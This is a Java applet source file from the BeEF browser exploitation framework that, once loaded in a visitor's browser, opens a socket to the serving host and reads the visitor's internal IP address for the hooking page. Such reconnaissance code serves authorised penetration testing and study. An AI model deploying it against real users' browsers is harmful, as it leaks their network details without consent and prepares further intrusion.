/*
 * Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
 * Browser Exploitation Framework (BeEF) - http://beefproject.com
 * See the file 'doc/COPYING' for copying permission
 */

import java.applet.Applet;
import java.applet.AppletContext;
import java.net.InetAddress;
import java.net.Socket;

/* to compiled it in MacOSX SnowLeopard/Lion:
*  javac -cp /System/Library/Frameworks/JavaVM.framework/Resources/Deploy.bundle/Contents/Resources/Java/plugin.jar get_internal_ip.java
*  author: antisnatchor (adapted from Lars Kindermann applet)
*/
public class get_internal_ip extends Applet {
    String Ip = "unknown";
    String internalIp = "unknown";
    String IpL = "unknown";

    private String MyIP(boolean paramBoolean) {
        Object obj = "unknown";
        String str2 = getDocumentBase().getHost();
        int i = 80;
        if (getDocumentBase().getPort() != -1) i = getDocumentBase().getPort();
        try {
            String str1 = new Socket(str2, i).getLocalAddress().getHostAddress();
            if (!str1.equals("255.255.255.255")) obj = str1;
        } catch (SecurityException localSecurityException) {
            obj = "FORBIDDEN";
        } catch (Exception localException1) {
            obj = "ERROR";
        }
        if (paramBoolean) try {
            obj = new Socket(str2, i).getLocalAddress().getHostName();
        } catch (Exception localException2) {
        }
        return (String) obj;
    }

    public void init() {
        this.Ip = MyIP(false);
    }

    public String ip() {
        return this.Ip;
    }

    public String internalIp() {
        return this.internalIp;
    }

    public void start() {
    }
}